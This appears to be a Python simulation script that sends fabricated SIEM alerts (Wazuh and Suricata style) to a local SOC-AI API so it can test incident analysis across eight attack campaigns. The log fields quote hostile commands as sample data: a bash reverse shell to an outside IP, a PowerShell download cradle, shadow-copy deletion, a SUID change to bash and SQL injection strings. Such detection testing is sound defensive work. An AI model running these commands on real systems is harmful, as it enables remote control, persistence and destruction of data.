"""
Full Simulation Script - sends a rich mix of attack scenarios and UEBA-triggering
events through the /manual API so the AI engine can produce complete incident reports.

Run from the host (outside Docker):
    python soc-ai/run_full_simulation.py

The script:
  1. Seeds UEBA baselines for 3 users via the /manual endpoint
  2. Fires 8 distinct attack campaigns (different IPs, tactics, TTPs)
  3. Waits between campaigns so the AI can analyse each one separately
  4. Prints a live status line for every alert sent
"""

import requests
import time
import random
import json
from datetime import datetime

API = "http://localhost:8001/api/v1/alerts/manual"
INCIDENTS_URL = "http://localhost:8001/api/v1/alerts/incidents"

# -- helpers -------------------------------------------------------------------

def alert(
    source_system="wazuh",
    rule_desc="",
    full_log="",
    level=5,
    srcip=None,
    dstip=None,
    user=None,
    process=None,
    mitre_id=None,
    mitre_name=None,
    file_hash=None,
    proto=None,
    category=None,
):
    data = {
        "source_system": source_system,
        "original_data": {
            "rule": {
                "description": rule_desc,
                "level": level,
                **({"mitre": {"id": mitre_id, "tactic": mitre_name}} if mitre_id else {}),
            },
            "full_log": full_log,
            **({"srcip": srcip} if srcip else {}),
            **({"dstip": dstip} if dstip else {}),
            **({"srcuser": user} if user else {}),
            **({"process": {"name": process}} if process else {}),
            **({"file": {"hash": {"sha256": file_hash}}} if file_hash else {}),
            **({"network": {"protocol": proto}} if proto else {}),
            **({"event_type": category} if category else {}),
            "id": f"sim-{random.randint(100000, 999999)}",
            "timestamp": datetime.utcnow().isoformat() + "Z",
        },
    }
    try:
        r = requests.post(API, json=data, timeout=10)
        status = r.status_code
        body = r.json() if r.ok else {}
        flag = "[OK]" if r.ok else "[ERR]"
        print(f"  {flag} [{status}] {rule_desc[:65]}")
        return body
    except Exception as e:
        print(f"  [ERR] {rule_desc[:65]} - {e}")
        return {}


def separator(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")


def wait(seconds, reason=""):
    if reason:
        print(f"\n  [WAIT] Waiting {seconds}s - {reason}")
    for i in range(seconds, 0, -5):
        time.sleep(5)
        print(f"      {i}s remaining...")


def check_incidents():
    try:
        r = requests.get(INCIDENTS_URL, timeout=10)
        data = r.json()
        print(f"\n  [CHART]  Incidents in history: {len(data)}")
        for inc in data[:3]:
            score = inc.get("risk_score", 0)
            status = inc.get("status", "?")
            tactic = inc.get("mitre_tactic", "?")
            print(f"      - [{score:>3}] {inc['id']}  status={status}  tactic={tactic}")
    except Exception as e:
        print(f"    Could not read incidents: {e}")


# 
# PHASE 0 - UEBA Baseline
# 

separator("PHASE 0 - UEBA Baseline: establishing normal behaviour for 3 users")

USERS = {
    "john.admin": {
        "ips": ["10.0.1.45", "10.0.1.46"],
        "dsts": ["10.0.50.10", "10.0.50.11"],
        "hosts": ["db-core-prod", "fileshare-01"],
        "procs": ["chrome.exe", "ssms.exe", "outlook.exe"],
    },
    "svc_backup": {
        "ips": ["10.0.2.100"],
        "dsts": ["10.0.50.20", "10.0.50.21"],
        "hosts": ["backup-server", "nas-01"],
        "procs": ["robocopy.exe", "veeam.exe"],
    },
    "root": {
        "ips": ["192.168.0.10"],
        "dsts": ["192.168.0.1", "192.168.0.50"],
        "hosts": ["linux-srv-01", "linux-srv-02"],
        "procs": ["bash", "sshd", "cron"],
    },
}

for username, profile in USERS.items():
    for i in range(6):
        alert(
            rule_desc="Successful Logon",
            full_log=f"Successful authentication for {username}",
            level=3,
            srcip=random.choice(profile["ips"]),
            dstip=random.choice(profile["dsts"]),
            user=username,
            process=random.choice(profile["procs"]),
        )
        time.sleep(0.3)
    print(f"   Baseline seeded for '{username}'")

# 
# CAMPAIGN 1 - SSH Brute Force  Root Compromise
# 

separator("CAMPAIGN 1 - SSH Brute Force  Root Compromise (Attacker: 172.126.230.200)")

ATK1 = "172.126.230.200"
VIC1 = "10.0.0.50"

for i in range(12):
    alert(
        rule_desc="SSHD Authentication Failed",
        full_log=f"Failed password for invalid user admin from {ATK1} port {50000+i} ssh2",
        level=6,
        srcip=ATK1, dstip=VIC1,
        user="admin",
        mitre_id="T1110", mitre_name="Brute Force",
    )
    time.sleep(0.4)

alert(
    rule_desc="SSHD Authentication Success after Multiple Failures",
    full_log=f"Accepted password for root from {ATK1} port 50012 ssh2",
    level=13,
    srcip=ATK1, dstip=VIC1,
    user="root",
    mitre_id="T1078", mitre_name="Valid Accounts",
)
alert(
    rule_desc="Privilege Escalation - sudo su executed",
    full_log=f"root ran: sudo su - from {ATK1}",
    level=14,
    srcip=ATK1, dstip=VIC1,
    user="root",
    process="sudo",
    mitre_id="T1548", mitre_name="Abuse Elevation Control Mechanism",
)
alert(
    rule_desc="Suspicious Shell Spawned by SSH Daemon",
    full_log=f"sshd spawned /bin/bash on {VIC1}",
    level=12,
    srcip=ATK1, dstip=VIC1,
    user="root", process="bash",
    mitre_id="T1059", mitre_name="Command and Scripting Interpreter",
)

wait(360, "waiting for AI to analyse Campaign 1...")
check_incidents()

# 
# CAMPAIGN 2 - Credential Dumping + Lateral Movement (john.admin anomaly)
# 

separator("CAMPAIGN 2 - Credential Dumping + Lateral Movement (john.admin compromised)")

ATK2 = "185.15.20.100"   # never seen before for john.admin
VIC2 = "10.0.99.99"

# UEBA anomaly: john.admin from a brand new external IP
alert(
    rule_desc="Suspicious Process Execution - mimikatz",
    full_log=f"User john.admin executed mimikatz.exe from external IP {ATK2}",
    level=15,
    srcip=ATK2, dstip="10.0.1.45",
    user="john.admin",
    process="mimikatz.exe",
    mitre_id="T1003", mitre_name="OS Credential Dumping",
)
time.sleep(1)
alert(
    rule_desc="LSASS Memory Read Detected",
    full_log=f"Process mimikatz.exe opened handle to lsass.exe on 10.0.1.45",
    level=15,
    srcip=ATK2, dstip="10.0.1.45",
    user="john.admin",
    process="mimikatz.exe",
    mitre_id="T1003.001", mitre_name="LSASS Memory",
)
time.sleep(0.5)
alert(
    rule_desc="SMB Lateral Movement Detected",
    full_log=f"john.admin authenticated to {VIC2} via SMB from {ATK2}",
    level=12,
    srcip=ATK2, dstip=VIC2,
    user="john.admin",
    mitre_id="T1021.002", mitre_name="SMB/Windows Admin Shares",
)
alert(
    rule_desc="Remote Service Creation via SMB",
    full_log=f"Service installed on {VIC2} by john.admin",
    level=13,
    srcip=ATK2, dstip=VIC2,
    user="john.admin",
    process="services.exe",
    mitre_id="T1543.003", mitre_name="Create or Modify System Process",
)
alert(
    rule_desc="Pass-the-Hash Attack Detected",
    full_log="NTLMv2 hash reuse detected for john.admin moving to domain-controller",
    level=14,
    srcip=ATK2, dstip="10.0.50.10",
    user="john.admin",
    mitre_id="T1550.002", mitre_name="Pass the Hash",
)

wait(360, "waiting for AI to analyse Campaign 2...")
check_incidents()

# 
# CAMPAIGN 3 - Ransomware Deployment (svc_backup account abused)
# 

separator("CAMPAIGN 3 - Ransomware Deployment via Backup Service Account")

ATK3 = "10.0.2.100"
FILE_HASH = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

alert(
    rule_desc="Suspicious File Encryption Activity Detected",
    full_log=f"svc_backup renamed 1000+ files with .locked extension on nas-01",
    level=15,
    srcip=ATK3, dstip="10.0.50.20",
    user="svc_backup",
    process="veeam.exe",
    file_hash=FILE_HASH,
    mitre_id="T1486", mitre_name="Data Encrypted for Impact",
)
time.sleep(0.5)
alert(
    rule_desc="Ransomware Note Dropped",
    full_log="File HOW_TO_RECOVER.txt created in every directory on nas-01",
    level=15,
    srcip=ATK3, dstip="10.0.50.20",
    user="svc_backup",
    process="robocopy.exe",
    mitre_id="T1491", mitre_name="Defacement",
)
alert(
    rule_desc="Shadow Copy Deletion Detected",
    full_log="vssadmin.exe delete shadows /all /quiet executed by svc_backup",
    level=15,
    srcip=ATK3, dstip="10.0.50.21",
    user="svc_backup",
    process="vssadmin.exe",
    mitre_id="T1490", mitre_name="Inhibit System Recovery",
)
alert(
    rule_desc="Mass File Encryption on Network Share",
    full_log="5000 files encrypted across backup-server and fileshare-01",
    level=15,
    srcip=ATK3, dstip="10.0.50.21",
    user="svc_backup",
    file_hash=FILE_HASH,
    mitre_id="T1486", mitre_name="Data Encrypted for Impact",
)
alert(
    rule_desc="Backup Catalogue Wiped",
    full_log="All Veeam backup jobs deleted by svc_backup at 03:14 UTC",
    level=15,
    srcip=ATK3, dstip="10.0.50.20",
    user="svc_backup",
    process="veeam.exe",
    mitre_id="T1485", mitre_name="Data Destruction",
)

wait(360, "waiting for AI to analyse Campaign 3 (Ransomware)...")
check_incidents()

# 
# CAMPAIGN 4 - Suricata: C2 Beacon + DNS Tunnelling
# 

separator("CAMPAIGN 4 - Suricata: Cobalt Strike C2 Beacon + DNS Tunnelling")

ATK4_C2  = "185.220.101.55"
VIC4     = "10.0.0.25"

for i in range(5):
    alert(
        source_system="suricata",
        rule_desc="ET MALWARE CobaltStrike Beacon Observed",
        full_log=f"ET MALWARE CobaltStrike Beacon: {VIC4} -> {ATK4_C2}:443",
        level=13,
        srcip=VIC4, dstip=ATK4_C2,
        proto="tls",
        category="A Network Trojan was detected",
        mitre_id="T1071.001", mitre_name="Web Protocols",
    )
    time.sleep(1)

alert(
    source_system="suricata",
    rule_desc="ET DNS Query for Known Malicious Domain",
    full_log=f"DNS query for evil-c2-infra.ru from {VIC4}",
    level=12,
    srcip=VIC4, dstip="8.8.8.8",
    proto="dns",
    mitre_id="T1071.004", mitre_name="DNS",
)
alert(
    source_system="suricata",
    rule_desc="ET POLICY DNS Tunnelling Detected",
    full_log=f"Excessively long DNS TXT record response from {VIC4}",
    level=13,
    srcip=VIC4, dstip="8.8.8.8",
    proto="dns",
    mitre_id="T1048.003", mitre_name="Exfiltration Over Unencrypted Non-C2 Protocol",
)
alert(
    source_system="suricata",
    rule_desc="ET MALWARE Potential APT29 Dropper TLS Certificate",
    full_log=f"TLS certificate fingerprint matches known APT29 infrastructure",
    level=14,
    srcip=VIC4, dstip=ATK4_C2,
    proto="tls",
    mitre_id="T1573.002", mitre_name="Asymmetric Cryptography",
)

wait(360, "waiting for AI to analyse Campaign 4 (C2 + DNS Tunnelling)...")
check_incidents()

# 
# CAMPAIGN 5 - Web Application Attack: SQLi  RCE
# 

separator("CAMPAIGN 5 - Web Application Attack: SQL Injection  Remote Code Execution")

ATK5 = "91.108.4.200"
VIC5 = "10.0.100.10"

payloads = [
    "GET /login.php?user=' OR '1'='1",
    "GET /search?q=1' UNION SELECT null,null,null--",
    "POST /api/users -- SLEEP(5) injected",
    "GET /admin?id=1;DROP TABLE users--",
]
for p in payloads:
    alert(
        source_system="wazuh",
        rule_desc="SQL Injection Attempt Detected",
        full_log=f"{ATK5} -> {VIC5}: {p}",
        level=10,
        srcip=ATK5, dstip=VIC5,
        mitre_id="T1190", mitre_name="Exploit Public-Facing Application",
    )
    time.sleep(0.5)

alert(
    rule_desc="Remote Code Execution via Web Shell",
    full_log=f"cmd.exe spawned by w3wp.exe on {VIC5} - suspected web shell",
    level=15,
    srcip=ATK5, dstip=VIC5,
    process="cmd.exe",
    mitre_id="T1505.003", mitre_name="Web Shell",
)
alert(
    rule_desc="Outbound Connection from Web Server Process",
    full_log=f"w3wp.exe initiated outbound connection to {ATK5}:4444",
    level=13,
    srcip=VIC5, dstip=ATK5,
    process="w3wp.exe",
    mitre_id="T1071.001", mitre_name="Web Protocols",
)

wait(360, "waiting for AI to analyse Campaign 5 (SQLi  RCE)...")
check_incidents()

# 
# CAMPAIGN 6 - Insider Threat: Data Exfiltration by Privileged User
# 

separator("CAMPAIGN 6 - Insider Threat: Unusual Data Exfiltration by john.admin")

ATK6 = "10.0.1.45"    # known IP for john.admin - NOT anomalous in IP check
EXT6 = "203.0.113.50" # external destination

# UEBA: john.admin at 3 AM (unusual hour) + new destination
alert(
    rule_desc="Large Outbound Data Transfer - Unusual Volume",
    full_log=f"john.admin transferred 22GB to external IP {EXT6} at 03:14 UTC",
    level=12,
    srcip=ATK6, dstip=EXT6,
    user="john.admin",
    process="robocopy.exe",
    mitre_id="T1048", mitre_name="Exfiltration Over Alternative Protocol",
)
alert(
    rule_desc="Sensitive File Access Outside Business Hours",
    full_log="john.admin accessed /finance/Q2_budgets.xlsx at 03:12 UTC",
    level=10,
    srcip=ATK6, dstip="10.0.50.11",
    user="john.admin",
    process="excel.exe",
    mitre_id="T1083", mitre_name="File and Directory Discovery",
)
alert(
    rule_desc="USB Mass Storage Device Connected",
    full_log="USB storage device 'SanDisk 256GB' mounted by john.admin",
    level=8,
    srcip=ATK6,
    user="john.admin",
    mitre_id="T1052.001", mitre_name="Exfiltration over USB",
)
alert(
    rule_desc="Archive Created from Sensitive Directory",
    full_log="7z.exe compressing /data/customer-pii/ - operator: john.admin",
    level=12,
    srcip=ATK6, dstip=EXT6,
    user="john.admin",
    process="7z.exe",
    mitre_id="T1560", mitre_name="Archive Collected Data",
)

wait(360, "waiting for AI to analyse Campaign 6 (Insider Threat)...")
check_incidents()

# 
# CAMPAIGN 7 - Linux Kernel Exploit + Persistence
# 

separator("CAMPAIGN 7 - Linux Kernel Exploit + Persistence Mechanism")

ATK7 = "45.142.212.100"
VIC7 = "192.168.0.10"

alert(
    rule_desc="Exploit Attempt - CVE-2023-0386 OverlayFS Privilege Escalation",
    full_log=f"Kernel exploit triggered by PID 3422 on {VIC7}",
    level=15,
    srcip=ATK7, dstip=VIC7,
    process="exploit_cve_2023_0386",
    user="nobody",
    mitre_id="T1068", mitre_name="Exploitation for Privilege Escalation",
)
alert(
    rule_desc="SUID Binary Modified",
    full_log=f"chmod +s /bin/bash executed on {VIC7}",
    level=14,
    srcip=ATK7, dstip=VIC7,
    user="root",
    process="chmod",
    mitre_id="T1548.001", mitre_name="Setuid and Setgid",
)
alert(
    rule_desc="Crontab Modified by Unexpected User",
    full_log="Cron entry added: '* * * * * /tmp/.hidden/beacon.sh' for root",
    level=13,
    srcip=VIC7,
    user="root",
    process="crontab",
    mitre_id="T1053.003", mitre_name="Cron",
)
alert(
    rule_desc="Hidden Directory Created in /tmp",
    full_log="mkdir /tmp/.hidden - by unknown process on linux-srv-01",
    level=10,
    srcip=VIC7,
    user="root",
    process="mkdir",
    mitre_id="T1564.001", mitre_name="Hidden Files and Directories",
)
alert(
    rule_desc="Reverse Shell Detected - /bin/bash -i",
    full_log=f"bash -i >& /dev/tcp/{ATK7}/9001 0>&1 executed on {VIC7}",
    level=15,
    srcip=VIC7, dstip=ATK7,
    user="root",
    process="bash",
    mitre_id="T1059.004", mitre_name="Unix Shell",
)

wait(360, "waiting for AI to analyse Campaign 7 (Linux Exploit)...")
check_incidents()

# 
# CAMPAIGN 8 - Phishing  Macro Execution  PowerShell Download Cradle
# 

separator("CAMPAIGN 8 - Phishing  Malicious Macro  PowerShell Download Cradle")

VIC8 = "10.0.0.35"
ATK8 = "104.21.45.220"

alert(
    rule_desc="Phishing Email with Malicious Attachment Detected",
    full_log="Email from invoice-payroll@att-bank.ru - attachment: Invoice_Q2.xlsm",
    level=10,
    srcip="smtp-gateway",
    dstip=VIC8,
    mitre_id="T1566.001", mitre_name="Spearphishing Attachment",
)
alert(
    rule_desc="Macro Execution in Office Document",
    full_log="WINWORD.EXE executing embedded VBA macro in Invoice_Q2.xlsm",
    level=12,
    srcip=VIC8, dstip=ATK8,
    process="WINWORD.EXE",
    mitre_id="T1137.001", mitre_name="Office Application Startup",
)
alert(
    rule_desc="Suspicious PowerShell Download Cradle",
    full_log=f"powershell.exe -enc IEX (New-Object Net.WebClient).DownloadString('{ATK8}/payload.ps1')",
    level=14,
    srcip=VIC8, dstip=ATK8,
    process="powershell.exe",
    mitre_id="T1059.001", mitre_name="PowerShell",
)
alert(
    rule_desc="Process Injection into svchost.exe",
    full_log=f"powershell.exe injected shellcode into svchost.exe (PID 812) on {VIC8}",
    level=15,
    srcip=VIC8, dstip=ATK8,
    process="svchost.exe",
    mitre_id="T1055", mitre_name="Process Injection",
)
alert(
    rule_desc="Persistence via Registry Run Key",
    full_log=r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run set to C:\Users\Public\svcupdate.exe",
    level=12,
    srcip=VIC8,
    process="reg.exe",
    mitre_id="T1547.001", mitre_name="Registry Run Keys / Startup Folder",
)
alert(
    rule_desc="New Scheduled Task Created",
    full_log="schtasks /create /tn 'Windows Update Helper' /tr 'C:\\ProgramData\\svcupdate.exe' /sc ONLOGON",
    level=11,
    srcip=VIC8,
    process="schtasks.exe",
    mitre_id="T1053.005", mitre_name="Scheduled Task",
)

wait(360, "waiting for AI to analyse Campaign 8 (Phishing chain)...")
check_incidents()

# 
# FINAL SUMMARY
# 

separator("SIMULATION COMPLETE - Final Dashboard State")
check_incidents()

try:
    r = requests.get(INCIDENTS_URL, timeout=10)
    all_incidents = r.json()
    analyzed = [i for i in all_incidents if i.get("status") not in ("pending", "")]
    print(f"\n  Total incidents in Redis : {len(all_incidents)}")
    print(f"  AI-analysed incidents    : {len(analyzed)}")
    if analyzed:
        avg_score = sum(i.get("risk_score", 0) for i in analyzed) / len(analyzed)
        print(f"  Average risk score       : {avg_score:.0f}/100")
        print("\n  Top 5 by risk score:")
        for inc in sorted(analyzed, key=lambda x: -x.get("risk_score", 0))[:5]:
            print(f"    [{inc['risk_score']:>3}] {inc['id']}  {inc.get('mitre_tactic','?')}")
except Exception as e:
    print(f"    Could not read final summary: {e}")

print("\n[DONE]  All campaigns fired. Refresh the dashboard to see results.\n")
